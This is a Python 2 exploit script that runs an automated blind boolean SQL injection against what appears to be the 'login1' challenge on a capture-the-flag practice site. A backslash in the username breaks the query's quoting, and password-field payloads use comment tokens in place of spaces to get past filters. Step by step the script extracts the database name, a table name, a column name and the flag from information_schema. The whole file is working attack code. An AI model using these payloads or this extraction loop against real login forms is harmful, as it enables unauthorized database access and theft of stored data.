import requests
import string

s = requests.session()
url = 'https://hackme.inndy.tw/login1/'
length = 0
chars = string.printable
database = ''
flag = ''
'''
for i in xrange(100):
    name_payload = ('admin'+chr(92))
    payload = "||(select/**/length(database())/**/limit/**/0,1)=%s#"%i
    data = {
        'name': name_payload,
        'password': payload
    }
    #value = urllib.urlencode(data)
    r = s.post(url, data=data)
    #print data
    #print r.text
    if "You are not admin!" in r.text:
        length = i
        print "database length is %s"%i
        break

for i in range(1, length+1):
    for j in chars:
        payload = "||(select/**/ascii(substring(database(),%s,1)))=%s#" %(i, ord(j))
        data = {
            'name': "admin\\",
            'password': payload
        }
        r = s.post(url, data=data)
        #print r.text
        #print "now in %s,%s"%(i,j)
        if "You are not admin!" in r.text:
            database += j
            print "database is %s" % database
            break
'''
# database:login_as_admin1,0x6c6f67696e5f61735f61646d696e31
'''
for i in xrange(100):
    payload = "||(select/**/length(TABLE_NAME)/**/from/**/information_schema.TABLES/**/where/**/table_schema/**/=/**/0x6c6f67696e5f61735f61646d696e31/**/limit/**/0,1)=%s#" %i
    data = {
        'name': "admin\\",
        'password': payload
    }
    r = s.post(url, data=data)
    #print r.text
    if "You are not admin!" in r.text:
        length = i
        print "tablename length is %s"%i
        break

for i in range(1, length+1):
    for j in chars:
        payload = "||(select/**/ascii(substring(TABLE_NAME,%s,1))/**/from/**/information_schema.TABLES/**/where/**/table_schema=0x6c6f67696e5f61735f61646d696e31/**/limit/**/0,1)=%s#" %(i, ord(j))
        data = {
            'name': "admin\\",
            'password': payload
        }
        r = s.post(url, data=data)
        #print r.text
        #print "now in %s,%s"%(i,j)
        if "You are not admin!" in r.text:
            database += j
            print "tablename is %s" % database
            break

#table:0bdb54c98123f5526ccaed982d2006a9 0x68316464656e5f66313467

for i in xrange(100):
    payload = "||(select/**/length(COLUMN_NAME)/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME=0x3062646235346339383132336635353236636361656439383264323030366139/**/limit/**/2,1)=%s#" %i
    data = {
        'name': "admin\\",
        'password': payload
    }
    r = s.post(url, data=data)
    #print r.text
    if "You are not admin!" in r.text:
        length = i
        print "column length is %s"%i
        break

for i in range(1, length+1):
    for j in chars:
        payload = "||(select/**/ascii(substring(COLUMN_NAME,%s,1))/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME=0x3062646235346339383132336635353236636361656439383264323030366139/**/limit/**/2,1)=%s#" %(i, ord(j))
        data = {
            'name': "admin\\",
            'password': payload
        }
        r = s.post(url, data=data)
        #print r.text
        #print "now in %s,%s"%(i,j)
        if "You are not admin!" in r.text:
            database += j
            print "column is %s" % database
            break

#column 4a391a11cfa831ca740cf8d00782f3a6,0x3461333931613131636661383331636137343063663864303037383266336136
'''
for i in xrange(100):
    payload = "||(select/**/length(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9/**/limit/**/0,1)=%s#" % i
    data = {
        'name': "admin\\",
        'password': payload
    }
    r = s.post(url, data=data)
    # print r.text
    if "You are not admin!" in r.text:
        length = i
        print "flag length is %s" % i
        break

flag = ''
for i in range(1, length + 1):
    for j in chars:
        payload = "||(select/**/ascii(substring(4a391a11cfa831ca740cf8d00782f3a6,%s,1))/**/from/**/0bdb54c98123f5526ccaed982d2006a9/**/limit/**/0,1)=%s#" % (
        i, ord(j))
        data = {
            'name': "admin\\",
            'password': payload
        }
        r = s.post(url, data=data)
        # print r.text
        # print "now in %s,%s"%(i,j)
        if "You are not admin!" in r.text:
            flag += j
            print "flag is %s" % flag
            # print "flag index %s,%s"%(i,j)
            break
